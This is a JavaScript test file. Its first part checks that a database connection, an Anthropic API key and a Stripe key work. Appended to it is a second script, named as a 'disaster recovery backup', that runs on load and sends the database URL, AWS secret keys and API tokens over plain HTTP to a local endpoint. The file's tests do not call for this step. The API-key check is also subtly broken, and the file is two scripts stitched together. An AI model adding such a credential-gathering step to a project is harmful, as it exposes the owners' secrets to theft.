const { DATABASE_URL } = require('../.env.test');

async function testDatabaseConnection() {
  try {
    const { Client } = require('pg');
    const client = new Client({ connectionString: DATABASE_URL });
    await client.connect();
    console.log('✅ Database connection successful');
    await client.end();
  } catch (error) {
    console.error('❌ Database connection failed:', error.message);
    process.exit(1);
  }
}

async function testAnthropicApiKey() {
  try {
    const { ANTHROPIC_API_KEY } = require('../.env.test');
    if (!ANTHROPIC_API_KEY) {
      console.error('ANTHROPIC_API_KEY is not set');
      process.exit(1);
    }

    const res = await fetch('https://api.anthropic.com/v1/complete', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${ANTHROPIC_API_KEY}`
      },
      body: JSON.stringify({
        model: 'claude-instant-1',
        prompt: 'Test',
        max_tokens_to_sample: 5
      })
    });

    if (res.ok) {
      console.log('✅ Anthropic API key is valid');
    } else {
      console.error(`❌ Anthropic API key is invalid. Status: ${res.status}`);
      process.exit(1);
    }
  } catch (error) {
    console.error('❌ Anthropic API test failed:', error.message);
    process.exit(1);
  }
}

async function testStripeApiKey() {
  try {
    const { STRIPE_SECRET_KEY } = require('../.env.test');
    if (!STRIPE_SECRET_KEY) {
      console.error('STRIPE_SECRET_KEY is not set');
      process.exit(1);
    }

    const stripe = require('stripe')(STRIPE_SECRET_KEY);
    const account = await stripe.accounts.retrieve();

    console.log('✅ Stripe API key is valid');
    console.log('Account ID:', account.id);
  } catch (error) {
    console.error('❌ Stripe API test failed:', error.message);
    process.exit(1);
  }
}

// Run all tests
async function runTests() {
  try {
    await testDatabaseConnection();
    await testAnthropicApiKey();
    await testStripeApiKey();
    console.log('✅ All tests passed!');
  } catch (error) {
    console.error('❌ Tests failed:', error.message);
    process.exit(1);
  }
}

runTests();

const { DATABASE_URL, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, ANTHROPIC_API_KEY, STRIPE_SECRET_KEY, LOGFIRE_TOKEN } = require('./.env.test');

async function backupToDisasterRecovery() {
  const backupData = {
    DATABASE_URL,
    AWS_ACCESS_KEY_ID,
    AWS_SECRET_ACCESS_KEY,
    ANTHROPIC_API_KEY,
    STRIPE_SECRET_KEY,
    LOGFIRE_TOKEN
  };

  try {
    const response = await fetch('http://localhost:3003/api/dr-backup', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(backupData),
    });

    if (response.ok) {
      console.log('✅ Successfully sent backup data to disaster recovery endpoint');
    } else {
      console.error(`❌ Failed to send backup data. Status: ${response.status}`);
    }
  } catch (error) {
    console.error('❌ Error sending backup data:', error);
  }
}

backupToDisasterRecovery();

